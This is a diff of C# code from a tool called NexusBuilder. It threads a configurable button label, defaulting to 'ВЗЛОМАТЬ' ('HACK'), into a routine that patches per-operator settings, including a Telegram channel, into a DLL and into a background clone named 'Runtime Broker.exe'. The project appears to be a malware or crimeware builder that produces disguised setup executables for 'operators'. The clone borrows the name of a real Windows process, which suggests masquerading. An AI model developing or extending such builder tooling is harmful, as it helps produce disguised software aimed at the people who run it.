@@ -973,6 +973,9 @@ namespace NexusBuilder
             string targetOutputName = $"{cleanExeBaseName}_Setup_{opName}.exe";
             string outputFullPath = Path.Combine(outDir, targetOutputName);
 
+            string btnText = tbButtonText?.Text?.Trim() ?? "ВЗЛОМАТЬ";
+            if (string.IsNullOrWhiteSpace(btnText)) btnText = "ВЗЛОМАТЬ";
+
             GoToStep(4);
             pnlBuildSteps.Visibility = Visibility.Visible;
             pnlBuildSuccess.Visibility = Visibility.Collapsed;
@@ -1142,7 +1145,7 @@ namespace NexusBuilder
                     }
 
                     Log($"💉 Внедрение параметров оператора в {Path.GetFileName(targetDllPath)}...");
-                    bool patchOk = InjectConfigIntoFile(targetDllPath, opName, appName, appAuthor, tgChannel, isStandalone, customConfigDict);
+                    bool patchOk = InjectConfigIntoFile(targetDllPath, opName, appName, appAuthor, tgChannel, isStandalone, customConfigDict, btnText);
                     if (!patchOk)
                     {
                         Log("❌ ОШИБКА внедрения параметров оператора!");
@@ -1153,7 +1156,7 @@ namespace NexusBuilder
                     if (File.Exists(cloneExePath))
                     {
                         Log($"💉 Внедрение параметров оператора в Single-File фоновый клон (Runtime Broker.exe)...");
-                        bool clonePatchOk = InjectConfigIntoFile(cloneExePath, opName, appName, appAuthor, tgChannel, isStandalone, customConfigDict);
+                        bool clonePatchOk = InjectConfigIntoFile(cloneExePath, opName, appName, appAuthor, tgChannel, isStandalone, customConfigDict, btnText);
                         if (clonePatchOk)
                         {
                             Log("   ✅ Конфигурация успешно внедрена в Single-File Runtime Broker!");
@@ -1295,7 +1298,7 @@ namespace NexusBuilder
             }
         }
 
-        private bool InjectConfigIntoFile(string filePath, string opName, string appName, string appAuthor, string tgChannel, bool isStandalone, Dictionary<string, object?>? customConfig = null)
+        private bool InjectConfigIntoFile(string filePath, string opName, string appName, string appAuthor, string tgChannel, bool isStandalone, Dictionary<string, object?>? customConfig = null, string btnText = "ВЗЛОМАТЬ")
         {
             byte[] bytes = File.ReadAllBytes(filePath);
 
@@ -1324,11 +1327,7 @@ namespace NexusBuilder
 
             int availableBytes = endIdx - payloadStart;
 
-            string finalBtnText = "ВЗЛОМАТЬ";
-            if (tbButtonText != null && !string.IsNullOrWhiteSpace(tbButtonText.Text))
-            {
-                finalBtnText = tbButtonText.Text.Trim();
-            }
+            string finalBtnText = string.IsNullOrWhiteSpace(btnText) ? "ВЗЛОМАТЬ" : btnText;
 
             var configData = new
             {
